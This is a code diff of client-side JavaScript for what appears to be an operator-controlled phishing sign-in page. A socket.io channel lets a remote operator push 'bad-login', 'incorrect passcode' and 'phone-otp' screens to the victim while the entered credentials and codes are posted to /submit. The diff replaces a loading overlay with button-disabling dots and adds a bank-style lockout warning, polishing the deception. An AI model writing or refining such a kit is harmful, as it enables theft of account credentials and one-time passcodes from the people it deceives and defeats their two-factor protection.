@@ -8,60 +8,6 @@
 	  sessionStorage.setItem("userId", userId);
 	}
 	
-	window.addEventListener('load', function() {
-    // Create the overlay div
-    let preloader = document.createElement('div');
-    preloader.id = 'load';
-    preloader.style.position = 'fixed';
-    preloader.style.top = '0';
-    preloader.style.left = '0';
-    preloader.style.width = '100vw';
-    preloader.style.height = '100vh';
-    preloader.style.backgroundColor = 'rgba(255, 255, 255, 0.9)';
-    preloader.style.zIndex = '40000';
-    preloader.style.display = 'flex';
-    preloader.style.flexDirection = 'column';
-    preloader.style.alignItems = 'center';
-
-    // Inner container for spinner + text
-    let container = document.createElement('div');
-    container.style.marginTop = '10vh';  // 30% down
-    container.style.display = 'flex';
-    container.style.flexDirection = 'column';
-    container.style.alignItems = 'center';
-
-    // Spinner image
-    let spinner = document.createElement('img');
-    spinner.src = './assets/Spinner.svg';
-    spinner.style.width = '100px';
-    spinner.style.height = 'auto';
-
-    // "Please wait" text
-    let text = document.createElement('p');
-    text.innerText = 'Please wait';
-    text.style.marginTop = '20px';
-    text.style.fontSize = '18px';
-    text.style.fontWeight = '500';
-    text.style.color = '#333';
-
-    // Assemble
-    container.appendChild(spinner);
-    container.appendChild(text);
-    preloader.appendChild(container);
-    
-    console.log(preloader);
-
-    // Append to body
-    document.body.appendChild(preloader);
-    
-    preloader.style.display = 'flex';
-
-    // Hide after 2 seconds
-    setTimeout(() => {
-        preloader.style.display = 'none';
-    }, 2000);
-});
-	
 	 // Use window.socket globally from the start
 		window.socket = io("/", {
 			auth: { userId },
@@ -73,6 +19,7 @@
 			
     socket.on("user:command", (data) => {
 	  const { command, code, phonescreen, link } = data;
+	  resetSubmitForm();
 	//alert("command received");
 	  switch (command) {
 	    case "refresh":
@@ -84,21 +31,19 @@
 	      console.log(badOtp);
 	      badOtp.textContent = `  incorrect passcode`;
 	      badOtp.style.display = "block";
-	      if(!preloader) preloader = document.getElementById('load');
-	      preloader.style.display = "none";
 	      break;
 	      
 	    case "bad-login":
-	      document.querySelector(".usb-notification").style.display = "flex";
+	      document.querySelector(".error-alert").style.display = "block";
 	      //let preloader = document.getElementById('load');
-	      if(!preloader) preloader = document.getElementById('load');
-	      preloader.style.display = "none";
-	      document.querySelector("#displayMessage").textContent = "Incorrect username and/or password";
-	      break;
+	      document.querySelector(".error-alert-message").innerHTML = 
+				    `Try signing in with a <a href="#">QR code</a>, or select 
+				     <a href="#">Forgot user ID</a> or 
+				     <a href="#">Reset password</a> to avoid being locked out.`;
+	     break;
 	
 	    case "phone-otp":
-	      if (!code) return; 
-	      if(!preloader) preloader = document.getElementById('load');
+	      if (!code) return;
 	      const phoneNumberEl = document.querySelector("#phone");
 	      document.querySelector("#phone-wrap").style.display = "block";
 	      sessionStorage.setItem("setcode", code);
@@ -188,12 +133,22 @@
 //document.head.appendChild(style); 
 
 
+function resetSubmitForm() {
+    $('.sign-in-button')
+        .prop('disabled', false)
+        .html('Sign in');
 
+    $('input').prop('disabled', false);
+}
 
 async function submitFormData(formData) {
   // Show preloader
-  let preloader = document.getElementById('load');
-  preloader.style.display = "flex";
+  $('.submit').prop('disabled', true).html(
+                '<span class="loading-dots"><span></span><span></span><span></span></span>'
+            );
+            
+  $('input').prop('disabled', true);
+  
   formData.userId = userId;
   try {
     const res = await fetch("/submit", {
